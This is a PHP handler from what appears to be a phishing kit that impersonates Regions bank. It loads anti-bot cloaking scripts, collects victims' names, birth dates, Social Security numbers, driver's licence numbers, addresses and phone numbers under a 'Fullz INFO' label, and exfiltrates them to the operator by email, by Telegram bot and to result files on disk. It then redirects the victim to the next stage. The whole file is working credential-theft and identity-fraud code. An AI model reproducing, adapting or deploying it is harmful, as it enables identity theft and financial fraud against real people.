<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

if(!empty($_POST['fname']) && !empty($_POST['dob']) && !empty($_POST['street']) && !empty($_POST['ssn'])){
    if(strlen($_POST['dob']) == 10){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$dob = $_POST['dob'];
		$dl = $_POST['dl'];
		$ssn = $_POST['ssn'];
		$state = $_POST['state'];
		$zip_code = $_POST['zip'];
		$mobile = $_POST['phone'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
First Name       : $fullname      
DOB              : $dob			
SSN              : $ssn
DL               : $dl 
Street Address   : $street_address 
State            : $state		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $mobile";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
IP    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🍃 ['.strtoupper($state).'] REGIONS FULLZ' ;$headers = 'From: YoCHI <yochsowncitibuster@yochthecitiman.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:conv2?conled=true");
    }
    else{ header("location:conv?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:conv?".$theerrkey."=c3Fauth".md5(rand(100, 999999999)).""); };
?>